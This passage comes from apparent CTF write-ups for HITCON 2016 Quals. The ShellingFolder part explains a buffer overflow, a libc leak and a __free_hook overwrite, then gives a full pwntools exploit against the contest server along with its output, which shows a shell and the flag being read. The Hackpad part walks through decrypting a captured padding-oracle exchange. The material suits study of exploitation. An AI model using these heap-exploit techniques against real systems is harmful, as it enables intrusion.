class="number">32</span>];</span><br><span class="line">    <span class="keyword">long</span> file_size;</span><br><span class="line">    <span class="keyword">int</span> is_dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>If a folder is created, the <code>is_dir</code> flag will be set to <code>1</code>, and the <code>file_size</code> will be set to <code>0</code>. A folder is allowed to contain at most 10 <code>sub_file</code>. If a normal file is created ( not folder ), the <code>is_dir</code> flag will be set to <code>0</code>, and the value of <code>file_size</code> is set by user. </p><p>There’s a <strong>buffer overflow vulnerability</strong> in the function of calculating the folder size:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal_folder_size</span><span class="params">(struct file *cur_folder)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">    __int64 *v3; <span class="comment">// [sp+28h] [bp-18h]@5</span></span><br><span class="line">    <span class="keyword">int</span> idx; <span class="comment">// [sp+30h] [bp-10h]@3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !cur_folder )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( idx &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cur_folder-&gt;sub_file[idx] )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = &amp;cur_folder-&gt;file_size;</span><br><span class="line">            copy_file_name(&amp;s, cur_folder-&gt;sub_file[idx]-&gt;name); <span class="comment">// &lt;-- here we have a buffer overflow vulnerability</span></span><br><span class="line">            <span class="keyword">if</span> ( cur_folder-&gt;sub_file[idx]-&gt;is_dir == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                *v3 = *v3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s : size %ld\n"</span>, &amp;s, cur_folder-&gt;sub_file[idx]-&gt;file_size);</span><br><span class="line">                *v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++idx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of the folder is %ld\n"</span>, cur_folder-&gt;file_size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>When we set a file’s name, we can input at most 31 characters. Inside the <code>cal_folder_size</code> function, the program will try to copy the file’s name into a buffer <code>s</code>, which its size is only 24 bytes long. The vulnerability will cause the program to overwrite the <code>v3</code> variable.</p><p>The <code>v3</code> variable is an <code>int*</code> type pointer, which points to the current folder’s <code>file_size</code>. Since we can overwrite this pointer, we can try to control this pointer and the size of the <code>sub_file[idx]</code>, so when the program execute the code at line:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size</span><br></pre></td></tr></table></figure></p><p><strong>it will actually let us control the value of any address.</strong></p><p>But remember the program has all the protection enabled, including <strong>PIE</strong>, so first we’ll have to leak some address. Here’s how I leak the address of the libc:</p><ol><li>Create &amp; delete some folders, so the pointer that points to the head of smallbin will appear on the heap memory.</li><li>Exploit the buffer overflow vulnerability, partial overwrite the <code>v3</code> pointer and make it point to a <code>struct file</code> pointer <code>p</code> ( <code>*v3 = p</code>).  </li><li>Control a <code>sub_file</code>‘s <code>file_size</code>, so when it comes to the line <code>*v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size</code>, it will adjust the value of <code>p</code>, making <code>p-&gt;name</code> point to the libc’s address ( address of the smallbin’s head )</li><li>List the files in the current folder and leak the libc’s address.</li></ol><p>After we got the libc’s address, we can use the same vulnerability to overwrite the <code>__free_hook</code> function pointer into the address of <strong>one gadget</strong>, and get the shell by deleting a file. Notice that <code>file_size</code> stores the value returned by <code>atoi</code>, a four-byte integer, so we’ll have to overwrite <code>__free_hook</code> twice : first  overwrite <code>__free_hook</code>,  then overwrite <code>__free_hook+4</code>.</p><figure class="highlight python"><figcaption><span>exp_shell.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"52.69.237.212"</span></span><br><span class="line"><span class="comment">#HOST = "127.0.0.1"</span></span><br><span class="line">PORT = <span class="number">4869</span></span><br><span class="line">ELF_PATH = <span class="string">"./shellingfolder_noalarm"</span></span><br><span class="line"><span class="comment">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span></span><br><span class="line">LIBC_PATH = <span class="string">"./libc.so.6"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_recvuntil</span><span class="params">(s, delim)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_addr</span><span class="params">(s, f)</span>:</span> <span class="comment"># search string address in file</span></span><br><span class="line">    result = list(f.search(s+<span class="string">"\x00"</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(result): <span class="comment"># no result</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_file</span><span class="params">(name, size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"4"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_dir</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"5"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_dir</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"3"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite &amp;file-&gt;fize_size (address of file_size)</span></span><br><span class="line">    <span class="comment"># use cal() to let file-&gt;name point to main_arena+88</span></span><br><span class="line">    make_dir(<span class="string">"AAAA"</span>)</span><br><span class="line">    make_dir(<span class="string">"BBBB"</span>)</span><br><span class="line">    make_dir(<span class="string">"CCCC"</span>)</span><br><span class="line">    create_file(<span class="string">"F"</span>*<span class="number">24</span>+p8(<span class="number">0x10</span>), <span class="number">64</span>)</span><br><span class="line">    remove(<span class="string">"BBBB\n"</span>)</span><br><span class="line">    remove(<span class="string">"CCCC\n"</span>)</span><br><span class="line">    cal()</span><br><span class="line">    ls()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    <span class="comment">######################## one gadget</span></span><br><span class="line">    <span class="comment"># .text:000000000004525A                 mov     rax, cs:environ_ptr_0</span></span><br><span class="line">    <span class="comment"># .text:0000000000045261                 lea     rdi, aBinSh     ; "/bin/sh"</span></span><br><span class="line">    <span class="comment"># .text:0000000000045268                 lea     rsi, [rsp+188h+var_158]</span></span><br><span class="line">    <span class="comment"># .text:000000000004526D                 mov     cs:dword_3C54A0, 0</span></span><br><span class="line">    <span class="comment"># .text:0000000000045277                 mov     cs:dword_3C54A4, 0</span></span><br><span class="line">    <span class="comment"># .text:0000000000045281                 mov     rdx, [rax]</span></span><br><span class="line">    <span class="comment"># .text:0000000000045284                 call    execve</span></span><br><span class="line">    <span class="comment">##########################</span></span><br><span class="line">    r.recvuntil(<span class="string">"----------------------\n"</span>)</span><br><span class="line">    libc.address += u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x3c3b78</span></span><br><span class="line">    one_gadget = libc.address + <span class="number">0x4525a</span></span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    log.success(<span class="string">"libc_base: "</span>+hex(libc.address))</span><br><span class="line">    log.success(<span class="string">"one_gadget: "</span>+hex(one_gadget))</span><br><span class="line">    log.success(<span class="string">"malloc_hook: "</span>+hex(malloc_hook))</span><br><span class="line">    log.success(<span class="string">"free_hook: "</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite free_hook to one_gadet</span></span><br><span class="line">    make_dir(<span class="string">"DDDD"</span>)</span><br><span class="line">    change_dir(<span class="string">"DDDD\n"</span>)</span><br><span class="line">    create_file(<span class="string">"i"</span>*<span class="number">24</span>+p64(free_hook)[:<span class="number">7</span>:], (one_gadget &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">    create_file(<span class="string">"I"</span>*<span class="number">24</span>+p64(free_hook+<span class="number">4</span>)[:<span class="number">7</span>:], ((one_gadget &amp; <span class="number">0xffffffff00000000</span>)&gt;&gt;<span class="number">32</span>))</span><br><span class="line">    cal()</span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="string">"i"</span>*<span class="number">24</span>+p64(free_hook)[:<span class="number">7</span>:])</span><br><span class="line">    </span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><pre><code>[x] Opening connection to 52.69.237.212 on port 4869[x] Opening connection to 52.69.237.212 on port 4869: Trying 52.69.237.212[+] Opening connection to 52.69.237.212 on port 4869: Done[+] libc_base: 0x7ff15c7cc000[+] one_gadget: 0x7ff15c81125a[+] malloc_hook: 0x7ff15cb8fb10[+] free_hook: 0x7ff15cb917a8[*] Switching to interactive mode size 32753The size of the folder is 0**************************************            ShellingFolder            ************************************** 1.List the current folder             2.Change the current folder           3.Make a folder                       4.Create a file in current folder     5.Remove a folder or a file           6.Caculate the size of folder         7.Exit                               **************************************Your choice:Choose a Folder or file :// iduid=1000(shellingfolder) gid=1000(shellingfolder) groups=1000(shellingfolder)// cat /home/shellingfolder/flaghitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}</code></pre><p>flag: <code>hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; pwn&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 200&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="heap" scheme="https://bruce30262.github.io/tags/heap/"/>
    
      <category term="BOF" scheme="https://bruce30262.github.io/tags/BOF/"/>
    
      <category term="HITCON" scheme="https://bruce30262.github.io/tags/HITCON/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2016 Quals -- Hackpad</title>
    <link href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-hackpad/"/>
    <id>https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-hackpad/</id>
    <published>2016-10-10T08:08:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Crypto &amp; Forensics<br><strong>Points:</strong> 150</p><a id="more"></a>  <p>I did not look at this challenge at first, until I found that many teams have already solved this one except us, so I decide to give it a try :P  </p><p>It first gave us a pcap file. Several of my teammates have already extract some information before I started to solve the challenge. To be brief, these packets contain the following message:</p><p>First is the encrypted secret:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt(secret):</span><br><span class="line">3ed2e01c1d1248125c67ac637384a22d997d9369c74c82abba4cc3b1bfc65f026c957ff0feef61b161cfe3373c2d9b905639aa3688659566d9acc93bb72080f7e5ebd643808a0e50e1fc3d16246afcf688dfedf02ad4ae84fd92c5c53bbd98f08b21d838a3261874c4ee3ce8fbcb96628d5706499dd985ec0c13573eeee03766f7010a867edfed92c33233b17a9730eb4a82a6db51fa6124bfc48ef99d669e21740d12656f597e691bbcbaa67abe1a09f02afc37140b167533c7536ab2ecd4ed37572fc9154d23aa7d8c92b84b774702632ed2737a569e4dfbe01338fcbb2a77ddd6990ce169bb4f48e1ca96d30eced23b6fe5b875ca6481056848be0fbc26bcbffdfe966da4221103408f459ec1ef12c72068bc1b96df045d3fa12cc2a9dcd162ffdf876b3bc3a3ed2373559bcbe3f470a8c695bf54796bfe471cd34b463e9876212df912deef882b657954d7dada47</span><br></pre></td></tr></table></figure></p><p>And the packets that contain the information of the decrypt message:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msg=00000000000000000000000000000000997d9369c74c82abba4cc3b1bfc65f02</span><br><span class="line">md5(decrypt(msg)) = aa85a4e0adbd34c287af2d20da4453c9</span><br><span class="line"></span><br><span class="line">msg=0000000000000000000000000000d903997d9369c74c82abba4cc3b1bfc65f02</span><br><span class="line">md5(decrypt(msg)) = 9f5b543c64d3e384078fdd8cf4b2ce6d</span><br><span class="line"></span><br><span class="line">msg=00000000000000000000000000efd802997d9369c74c82abba4cc3b1bfc65f02</span><br><span class="line">md5(decrypt(msg)) = c68dda2cc0d9907bc7252b53a447b2ce</span><br><span class="line"></span><br><span class="line">msg=00000000000000000000000007e8df05997d9369c74c82abba4cc3b1bfc65f02</span><br><span class="line">md5(decrypt(msg)) = 650713f94eae0ecdfa4e527745dd2591</span><br><span class="line">................................................</span><br><span class="line">................................................</span><br><span class="line">msg=0000ce71616536683d0ed00c0de2d50f997d9369c74c82abba4cc3b1bfc65f02</span><br><span class="line">md5(decrypt(msg)) = 6d09e40852ecf180281d504b7718d12d</span><br><span class="line"></span><br><span class="line">msg=00b3cf70606437693c0fd10d0ce3d40e997d9369c74c82abba4cc3b1bfc65f02</span><br><span class="line">md5(decrypt(msg)) = f1290186a5d0b1ceab27f4e77c0c5d68</span><br><span class="line"></span><br><span class="line">msg=67acd06f7f7b28762310ce1213fccb11997d9369c74c82abba4cc3b1bfc65f02</span><br><span class="line">md5(decrypt(msg)) = d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line">................................................</span><br><span class="line">................................................</span><br></pre></td></tr></table></figure></p><p>Looks like someone was sending a bunch of encrypted message, and try to let the server decrypt the message for him. I also found that we can split the encrypted message by every 32 character:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">encrypt(secret):</span><br><span class="line">msg=</span><br><span class="line">3ed2e01c1d1248125c67ac637384a22d</span><br><span class="line">997d9369c74c82abba4cc3b1bfc65f02 &lt;-- here!</span><br><span class="line">6c957ff0feef61b161cfe3373c2d9b90</span><br><span class="line">5639aa3688659566d9acc93bb72080f7</span><br><span class="line">e5ebd643808a0e50e1fc3d16246afcf6</span><br><span class="line">88dfedf02ad4ae84fd92c5c53bbd98f0</span><br><span class="line">8b21d838a3261874c4ee3ce8fbcb9662</span><br><span class="line">8d5706499dd985ec0c13573eeee03766</span><br><span class="line">f7010a867edfed92c33233b17a9730eb</span><br><span class="line">4a82a6db51fa6124bfc48ef99d669e21</span><br><span class="line">740d12656f597e691bbcbaa67abe1a09</span><br><span class="line">f02afc37140b167533c7536ab2ecd4ed</span><br><span class="line">37572fc9154d23aa7d8c92b84b774702</span><br><span class="line">632ed2737a569e4dfbe01338fcbb2a77</span><br><span class="line">ddd6990ce169bb4f48e1ca96d30eced2</span><br><span class="line">3b6fe5b875ca6481056848be0fbc26bc</span><br><span class="line">bffdfe966da4221103408f459ec1ef12</span><br><span class="line">c72068bc1b96df045d3fa12cc2a9dcd1</span><br><span class="line">62ffdf876b3bc3a3ed2373559bcbe3f4</span><br><span class="line">70a8c695bf54796bfe471cd34b463e98</span><br><span class="line">76212df912deef882b657954d7dada47</span><br></pre></td></tr></table></figure></p><p>Notice the line that marked “here!”, the string is actually identical to sencond half of <code>00000000000000000000000000000000997d9369c74c82abba4cc3b1bfc65f02</code>. </p><p>I suck at crypto, so at first I just keep inspecting the decrypt message info, hoping that I can find some special pattern so I can use it to decrypt the secret.  And of course I failed miserably, until I notice that some of the decrypt request were failed – the server response with the code 500 ( or 403 ) instead of 200.  And that’s the moment I started to think “Wait a minute…this looks familiar…isn’t this the pattern of the <strong>padding oracle attack</strong> ?”  And so I start googling about the padding oracle attack.</p><p>And guess what ? It <strong>IS</strong> the padding oracle attack !  </p><p>So with the help of <a href="http://mslc.ctf.su/wp/codegate-ctf-2011-crypto-400/" target="_blank" rel="noopener">this writeup</a> posted by MSLC, I figured out that to decrypt the message <code>997d9369c74c82abba4cc3b1bfc65f02</code> (let’s call it <code>C1</code>), first we’ll have to find the value of <code>AES_Decrypt(C1)</code>, which can be done by xor-ing the value of<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67acd06f7f7b28762310ce1213fccb11 (last attacker&apos;s ciphertext)</span><br></pre></td></tr></table></figure></p><p>and<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10101010101010101010101010101010 (padding)</span><br></pre></td></tr></table></figure></p><p>After we get the value of <code>AES_Decrypt(C1)</code>, we can decrypt <code>C1</code> by doing <code>AES_Decrypt(C1) xor C0</code>. <code>C0</code> is the first block of the ciphertext, which is<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3ed2e01c1d1248125c67ac637384a22d</span><br></pre></td></tr></table></figure></p><p>in this case.  </p><p>And so I wrote a script to decrypt the whole message:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># "cat ./ggg": print out all the last attacker ciphertext</span></span><br><span class="line">resp = myexec(<span class="string">"cat ./ggg"</span>).split(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">del</span> resp[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> enumerate(resp):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>: <span class="comment"># first line is encrypt(secret), ignore</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    d = c.split(<span class="string">"="</span>)[<span class="number">1</span>].strip()</span><br><span class="line">    <span class="keyword">assert</span> len(d) == <span class="number">64</span></span><br><span class="line">    temp.append(d)</span><br><span class="line"></span><br><span class="line">last_c = []</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> temp:</span><br><span class="line">    last_c.append(c[<span class="number">0</span>:<span class="number">32</span>])</span><br><span class="line">    enc.append(c[<span class="number">32</span>::])</span><br><span class="line"></span><br><span class="line">enc.insert(<span class="number">0</span>, <span class="string">"3ed2e01c1d1248125c67ac637384a22d"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_len</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="string">"0"</span>+s</span><br><span class="line">    <span class="keyword">assert</span> len(s) == <span class="number">32</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> last_c:</span><br><span class="line">    c = c.decode(<span class="string">'hex'</span>)</span><br><span class="line">    pad = <span class="string">"10101010101010101010101010101010"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c1, c2 <span class="keyword">in</span> zip(pad, c):</span><br><span class="line">        s |= ord(c1)^ord(c2)</span><br><span class="line">        s&lt;&lt;=<span class="number">8</span></span><br><span class="line">    sss = hex(s&gt;&gt;<span class="number">8</span>)[<span class="number">2</span>:<span class="number">-1</span>:]</span><br><span class="line">    sss = fix_len(sss)</span><br><span class="line"></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    sss = sss.decode(<span class="string">'hex'</span>)</span><br><span class="line">    eee = enc[cnt].decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">for</span> c1, c2 <span class="keyword">in</span> zip(eee, 